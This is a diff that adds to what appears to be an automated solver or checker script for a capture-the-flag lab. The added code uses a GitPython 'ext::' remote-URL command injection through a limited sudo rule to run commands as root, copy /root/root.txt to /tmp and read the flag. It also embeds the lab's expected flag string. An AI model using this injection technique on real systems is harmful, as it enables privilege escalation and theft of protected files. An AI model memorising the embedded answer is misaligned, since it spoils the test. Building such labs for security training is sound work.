@@ -112,3 +112,17 @@ probe = ssh_as(
 proof = ssh_as("prod", prod_credential.group(1), "stat -c %u /tmp/editorial-gitpython-root-check")
 assert proof.returncode == 0 and proof.stdout.strip() == "0", (probe.stderr, proof.stderr, proof.stdout)
 print("PASS: genuine GitPython clone transport executes as UID 0 through limited sudo", flush=True)
+
+# Finally obtain the per-instance root answer using the same actual Git
+# remote-ext path as the UID0 proof; never use Docker exec to read it.
+for remote in (
+    "ext::cp /root/root.txt /tmp/editorial-gitpython-root-answer",
+    "ext::chmod 0644 /tmp/editorial-gitpython-root-answer",
+):
+    ssh_as(
+        "prod", prod_credential.group(1),
+        "sudo -n /usr/local/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py '" + remote + "'",
+    )
+answer = ssh_as("prod", prod_credential.group(1), "cat /tmp/editorial-gitpython-root-answer")
+assert answer.returncode == 0 and answer.stdout.strip() == "TTP{ci_root_first_instance}", (answer.stdout, answer.stderr)
+print("PASS: real GitPython remote-ext privilege escalation recovers the private CI Root Flag", flush=True)
